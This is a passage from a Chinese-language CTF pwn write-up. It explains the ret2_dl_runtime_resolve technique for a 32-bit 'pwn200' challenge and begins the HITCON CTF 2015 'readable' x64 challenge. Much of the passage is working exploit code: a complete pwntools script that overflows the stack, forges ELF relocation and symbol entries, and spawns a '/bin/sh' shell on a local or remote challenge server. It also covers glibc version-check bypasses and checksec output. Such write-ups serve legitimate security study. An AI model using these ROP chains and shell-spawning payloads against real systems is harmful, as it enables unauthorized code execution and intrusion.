class="line">    io.send(p32(system_addr))</span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send "/bin/sh"')</span></span><br><span class="line">    io.send(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    io.interactive(prompt = pwnlib.term.text.bold_red(<span class="string">'$'</span>) + <span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h4 id="4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用"><a href="#4、方法二：如果题目未提供libc库，使用ret2-dl-runtime-resolve方式进行利用" class="headerlink" title="4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用"></a>4、方法二：如果题目未提供libc库，使用ret2_dl_runtime_resolve方式进行利用</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，利用<code>“\x00”</code>绕过<code>strlen()</code>的长度验证，输入构造的<code>17bytes</code>数据，将<code>nbytes</code>修改为<code>“0xFF”</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">"syclover\x00\xff\xff\xff\xff\xff\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><ul><li>2、程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。我们使用<code>read函数</code>将伪造的<strong><code>system函数</code></strong>的<strong><code>重定位表项数据</code></strong>、<strong><code>符号表项数据</code></strong>、<strong><code>字符串表项数据</code></strong>以及<strong><code>参数“/bin/sh”</code></strong>写入到内存中的<code>可写区域</code>，这里选择<code>bss段</code>和<code>shstrtab段之后</code>的区域。 然后，返回到<code>main函数</code>，进行<code>下一次payload</code>的传递，用于解析<code>system函数</code>地址，并<code>调用system函数</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">shellcode += p32(main_addr)</span><br><span class="line">ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><ul><li>3、程序从<code>标准输入</code>读取<strong><code>“name”</code></strong>的时候，同<code>第一步</code>一样。程序从<code>标准输入</code>读取<strong><code>“slogan”</code></strong>的时候，输入<code>另一段</code>精心构造的<code>一段ROP的shellcode</code>，劫持程序的<code>控制流</code>。首先调用<code>PLT0</code>处的代码，传入伪造的<code>system函数重定位表项</code>相对于<code>重定位表起始</code>的偏移量<code>reloc_index</code>，利用<strong><code>_dl_runtime_resolve()函数</code></strong>进行<code>system函数地址</code>的解析。<code>_dl_runtime_resolve()</code>函数解析完<code>system函数</code>的地址后，就会<code>调用system函数</code>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += p32(PLT0) + p32(reloc_index) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br></pre></td></tr></table></figure><p><strong><code>完整exp：</code></strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.binary = <span class="string">'./pwn200'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'i386'</span>,<span class="string">'bits'</span>:<span class="string">'32'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">DT_JMPREL = <span class="number">0x080482F8</span></span><br><span class="line">DT_SYMTAB = <span class="number">0x080481E0</span></span><br><span class="line">DT_STRTAB = <span class="number">0x08048260</span></span><br><span class="line">DT_VERSYM = <span class="number">0x080482C0</span></span><br><span class="line">PLT0 = <span class="number">0x08048350</span></span><br><span class="line">BSS_Addr = <span class="number">0x08049870</span></span><br><span class="line"></span><br><span class="line">system_got = <span class="number">0x080499A0</span></span><br><span class="line">ppp_ret = <span class="number">0x08048646</span></span><br><span class="line">send_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_plt = <span class="number">0x08048360</span></span><br><span class="line">read_got = <span class="number">0x08049850</span></span><br><span class="line">strlen_got = <span class="number">0x08049858</span></span><br><span class="line">main_addr = <span class="number">0x080484AC</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Addr r_offset; /* 表示重定位所作用的虚拟地址或相对基地址的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word r_info;   /* 重定位类型和符号表下标 */ 4byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Rel;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_reloc_data</span><span class="params">(sym_index,got_plt)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(got_plt) + p32(<span class="number">0x07</span> + (sym_index&lt;&lt;<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    Elf32_Word    st_name;  /* 符号名，符号在字符串表中的偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Addr    st_value; /* 符号的值，可能是地址或偏移 */ 4byte</span></span><br><span class="line"><span class="string">    Elf32_Word    st_size;  /* 符号的大小 */ 4byte</span></span><br><span class="line"><span class="string">    unsigned char st_info;  /* 符号类型及绑定属性 */ 1byte</span></span><br><span class="line"><span class="string">    unsigned char st_other; /* 符号的可见性 */ 1byte</span></span><br><span class="line"><span class="string">    Elf32_Section st_shndx; /* 节头表索引 */ 2byte</span></span><br><span class="line"><span class="string">&#125; Elf32_Sym;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_x86_sym_data</span><span class="params">(name_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p32(name_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># BSS_Addr(0x08049870) = DT_JMPREL(0x080482F8) + reloc_offset(0x1578)</span></span><br><span class="line">reloc_offset = <span class="number">0x1578</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sym_data_addr(0x080499C0) = DT_SYMTAB(0x080481E0) + sym_index(0x17e) * 16   (not useful)</span></span><br><span class="line">reloc_data_addr = BSS_Addr</span><br><span class="line">reloc_data = generate_x86_reloc_data(<span class="number">0x17e</span>,system_got)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = DT_STRTAB(0x08048260) + name_offset(0x1780)</span></span><br><span class="line">sym_data_addr = <span class="number">0x080499C0</span></span><br><span class="line">sym_data = generate_x86_sym_data(<span class="number">0x1780</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># func_name_addr(0x080499E0) = sym_data_addr + 0x20</span></span><br><span class="line">func_name_addr = sym_data_addr + <span class="number">0x20</span></span><br><span class="line">func_name = <span class="string">"system\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># binsh_str_addr(0x080499F0) = func_name_addr + 0x10</span></span><br><span class="line">binsh_str_addr = func_name_addr + <span class="number">0x10</span></span><br><span class="line">binsh_str = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'\\x'</span> + <span class="string">'%02X'</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> str])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_io</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        io = remote(<span class="string">'218.2.197.235'</span>,<span class="number">10101</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">'./pwn200'</span>)</span><br><span class="line">        <span class="comment"># io = gdb.debug('./pwn200','''</span></span><br><span class="line">        <span class="comment">#                             bp 0x080484AC</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048507</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048524</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048579</span></span><br><span class="line">        <span class="comment">#                             bp 0x08048596</span></span><br><span class="line">        <span class="comment">#                             bp 0x080485b8''')</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(io)</span>:</span></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment">#                 bp 0x080484AC</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048507</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048524</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048579</span></span><br><span class="line">    <span class="comment">#                 bp 0x08048596</span></span><br><span class="line">    <span class="comment">#                 bp 0x080485b8''')</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage1: Fake system's reloc_data,sym_data and str_data.----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[1] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[2] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[3] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(reloc_data_addr) + p32(len(reloc_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(sym_data_addr) + p32(len(sym_data))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(func_name_addr) + p32(len(func_name))</span><br><span class="line">    shellcode += p32(read_plt) + p32(ppp_ret) + p32(<span class="number">0</span>) + p32(binsh_str_addr) + p32(len(binsh_str))</span><br><span class="line">    shellcode += p32(main_addr)</span><br><span class="line">    ebp = p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[4] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># raw_input('[5] before send reloc_data')</span></span><br><span class="line">    io.send(reloc_data)</span><br><span class="line">    <span class="comment"># raw_input('[6] before send sym_data')</span></span><br><span class="line">    io.send(sym_data)</span><br><span class="line">    <span class="comment"># raw_input('[7] before send func_name')</span></span><br><span class="line">    io.send(func_name)</span><br><span class="line">    <span class="comment"># raw_input('[8] before send binsh_str')</span></span><br><span class="line">    io.send(binsh_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"----------------Stage2: Call system(\"/bin/sh\")----------------"</span></span><br><span class="line">    <span class="comment"># raw_input('[9] before receive "input name:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input name:\x00"</span>)</span><br><span class="line">    name = <span class="string">"syclover\x00"</span>.ljust(<span class="number">17</span>,<span class="string">"\xff"</span>)</span><br><span class="line">    <span class="comment"># raw_input('[10] before send name')</span></span><br><span class="line">    io.send(name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"name:"</span> + name</span><br><span class="line">    <span class="comment"># raw_input('[11] before receive "input slogan:\x00"')</span></span><br><span class="line">    io.recvuntil(<span class="string">"input slogan:\x00"</span>)</span><br><span class="line">    shellcode = <span class="string">""</span></span><br><span class="line">    shellcode += p32(PLT0) + p32(reloc_offset) + p32(main_addr) + p32(binsh_str_addr)</span><br><span class="line">    payload = <span class="string">'A'</span>*<span class="number">0x90</span> + p32(<span class="number">0</span>) + <span class="string">'A'</span>*<span class="number">8</span> + ebp + shellcode</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload_len:"</span> + str(len(payload))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"payload:"</span> + payload[<span class="number">0</span>:<span class="number">0x90</span>] + str_to_hex(payload[<span class="number">0x90</span>:<span class="number">0x94</span>]) + payload[<span class="number">0x94</span>:<span class="number">0x9C</span>] + str_to_hex(payload[<span class="number">0x9C</span>:])</span><br><span class="line">    <span class="comment"># raw_input('[12] before send payload')</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    io = get_io()</span><br><span class="line">    pwn(io)</span><br></pre></td></tr></table></figure></p><h3 id="4-3、x64的情况——HITCON-CTF-2015–readable"><a href="#4-3、x64的情况——HITCON-CTF-2015–readable" class="headerlink" title="4.3、x64的情况——HITCON CTF 2015–readable"></a>4.3、x64的情况——HITCON CTF 2015–readable</h3><h4 id="0、x86情况与x64情况的不同之处"><a href="#0、x86情况与x64情况的不同之处" class="headerlink" title="0、x86情况与x64情况的不同之处"></a>0、x86情况与x64情况的不同之处</h4><p>1、<strong><code>相关结构体大小</code></strong>不同：</p><blockquote><ul><li><strong><code>动态链接重定位表“.rel.plt”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Rel</code>，大小为<code>2*4=8字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Rela</code>，大小为<code>3*8=24字节</code>。<strong><code>x86情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>3字节</code>和<code>1字节</code>。<strong><code>x64情况</code></strong>的结构体成员<code>r_info</code>中<code>符号表下标</code>和<code>重定位类型</code>分别占用<code>4字节</code>和<code>4字节</code>。</li><li><strong><code>动态链接符号表“.dynsym”</code></strong>：<strong><code>x86情况</code></strong>使用<code>Elf32_Sym</code>，大小为<code>4*4=16字节</code>。<strong><code>x64情况</code></strong>使用<code>Elf64_Sym</code>，大小为<code>3*8=24字节</code>。<code>x86情况</code>和<code>x64情况</code>结构体成员的顺序不同。</li></ul></blockquote><p>2、<strong><code>reloc_arg含义</code></strong>不同：</p><blockquote><ul><li>1、<strong><code>x86情况</code></strong>: <code>reloc_arg == reloc_offset</code>，含义是所重定位符号的<code>重定位项</code>距离<code>重定位表“.rel.plt”</code>起始位置的<code>偏移</code>。重定位项地址<code>reloc = JMPREL + reloc_offset</code>。</li><li>2、<strong><code>x64情况</code></strong>: <code>reloc_arg == reloc_index</code>，含义是所重定位符号的<code>重定位项</code>在<code>重定位表“.rel.plt”</code>中的<code>下标</code>。重定位项地址<code>reloc = JMPREL + reloc_index*3*8</code>。</li></ul></blockquote><p>3、<strong><code>符号版本表(.gnu.version)</code></strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)   </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//获取动态符号版本表“.gnu.version”的地址</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">    <span class="comment">//ndx是当前符号所使用的glibc库版本在版本需要表(.gnu.version_r)中的版本结构体的vna_other成员的值</span></span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    <span class="comment">//l_version数组存储的是版本需要表(.gnu.version_r)中包含的二进制程序实际依赖的glibc库版本结构体指针</span></span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx];  <span class="comment">//得到当前所解析符号的glibc库版本信息</span></span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这段代码取<code>r_info的高位</code>作为<strong><code>符号版本表vernum(.gnu.version)</code></strong>的<code>下标</code>，访问对应的值并赋给<code>ndx</code>，<code>ndx</code>再作为<code>l_versions</code>表的<code>下标</code>，找到对应的值赋给<code>version</code>。<strong><code>ndx</code></strong>是当前符号所使用的<code>glibc库版本</code>在<strong><code>版本需要表(.gnu.version_r)</code></strong>中的<code>版本结构体(Elfxx_Vernaux)</code>的<code>vna_other</code>成员的值。<strong><code>l_versions</code></strong>是结构体<code>r_found_version</code>的数组。<strong><code>version</code></strong>表示的是<strong><code>版本需要表(.gnu.version_r)</code></strong>中包含的<code>此ELF文件</code>实际依赖的<code>glibc库版本结构体(r_found_version)</code>的指针。<br>&emsp;&emsp;<strong><code>64位情况</code></strong>下，我们构造的<code>fake链</code>一般位于<strong><code>bss段</code></strong>(<code>64位</code>下，<code>bss段</code>一般位于<strong><code>0x600000</code></strong>之后)，<strong><code>重定位表“.rela.plt”</code></strong>一般在<strong><code>0x400000</code></strong>左右，所以我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>一般会很大。又因为计算符号项地址<strong><code>&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>和符号版本项地址<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong>时，<code>数组的数据类型</code>的大小不同(<strong><code>symtab</code></strong>中的结构体大小为<code>0x18字节</code>，<strong><code>vernum</code></strong>的数据类型为<code>uint16_t</code>，大小为<code>0x2字节</code>)，这就导致<code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code>大概率会访问到<code>0x400000</code>到<code>0x600000</code>之间的<code>不可读区域</code>(64位下，这个区间一般不可读)，使得程序报错。<br>&emsp;&emsp;<strong><code>32位情况</code></strong>下，我们构造的<code>r_info的高位(sym_index)</code>和<code>reloc_arg</code>很小，所以计算<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>时，不会访问到<code>不可访问</code>的区域。所以我们只要让<code>vernum + sym_index*2</code>访问到的<code>ndx值合理</code>即可。关于<code>ndx的取值范围</code>在我的另一篇文章中有介绍，但也<code>只是猜测</code>。——<code>RCTF2015-WriteUp(Pwn)</code>。</p><p>为了<code>防止</code>出现这个错误，我们有几种方法。</p><blockquote><ul><li><strong><code>方法一：</code></strong>我们需要修改<code>判断流程</code>，使得<strong><code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code></strong>为0，从而绕开这块代码。而<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>在<strong><code>64位</code></strong>中的位置就是<code>link_map+0x1c8</code>。对应的，<code>32位</code>下为<code>link_map+0xe4</code>，所以我们需要<code>泄露link_map地址</code>，将其置为0。这种攻击方式依赖<code>源程序</code>自带的<code>输出函数</code>。</li><li><strong><code>方法二：</code></strong>使得<strong><code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code></strong> == <strong><code>vernum + sym_index*2</code></strong>可读，并且读出的<code>ndx值合理</code>。我们可以通过修改<code>.dynamic段</code>中<code>DT_VERSYM动态段类型</code>所对应的<code>动态段表项</code>，使<code>vernum表的地址</code>改变。然后影响<code>vernum + sym_index*2</code>的计算结果，使得到<code>符号版本表项的地址</code>可读，并且此地址处的<code>ndx值合理</code>。<code>ndx的值</code>一般不宜太大，设为<code>0x0000</code>应该是通用的。这种攻击方式依赖<code>源程序</code>自带的<code>输入函数</code>。能够任意地址写。</li></ul></blockquote><h4 id="1、检查程序开启的保护机制-1"><a href="#1、检查程序开启的保护机制-1" class="headerlink" title="1、检查程序开启的保护机制"></a>1、检查程序开启的保护机制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec readable</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/readable&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以看到此程序只开启了<code>NX(堆栈不可执行)</code>。</p><h4 id="2、静态分析-1"><a href="#2、静态分析-1" class="headerlink" title="2、静态分析"></a>2、静态分析</h4><p>IDA反编译后<code>主函数</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h] buf大小只有16byte</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">32u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;这道题的<code>漏洞</code>很明显，<code>buf的实际大小</code>只有<code>16byte</code>，但是read()函数却<code>最大可以读取32byte</code>，这就造成了<code>栈溢出</code>，会覆盖<code>rbp</code>和<code>ret_address</code>。通过将<code>ret_address</code>覆盖为<code>main函数的入口地址</code>，从而对漏洞实现<code>多次利用</code>，达到<code>任意地址写</code>的目的。由于只有任意地址<code>写权限</code>，而没有<code>读权限</code>，因此几乎<code>无法泄露信息</code>，利用常规方法则会比较难。</p><h4 id="3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0"><a href="#3、方法一：爆破read-中syscall的偏移，并修改eax为0x3b，调用execve-“-bin-sh”-0-0" class="headerlink" title="3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)"></a>3、方法一：爆破read()中syscall的偏移，并修改eax为0x3b，调用execve(“/bin/sh”,0,0)</h4><p><strong><code>利用思路：</code></strong></p><ul><li>1、爆破获取<code>read函数</code>中调用<code>syscall的偏移</code>，并将其覆盖到<code>read的GOT表内容</code>的<code>最后一个字节</code>，再将<code>eax</code>修改成<code>0x3b</code>，然后将<code>“/bin/sh”</code>压入栈，并将<code>rdi</code>指向它，同时将<code>rsi</code>和<code>rdx</code>分别设置为<code>0</code>，相当于调用了<strong><code>execve(&quot;/bin/sh&quot;,0,0)</code></strong>，从而实现shell的获取。</li></ul><p>每个<code>系统调用</code>中都有如下的实现：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;read函数</span></span><br><span class="line">&lt;read+n&gt;  <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">&lt;read+(n+<span class="number">5</span>)&gt; <span class="keyword">syscall</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;write函数</span></span><br><span class="line">&lt;write+n&gt;   <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">&lt;write+(n+<span class="number">5</span>)&gt; <span 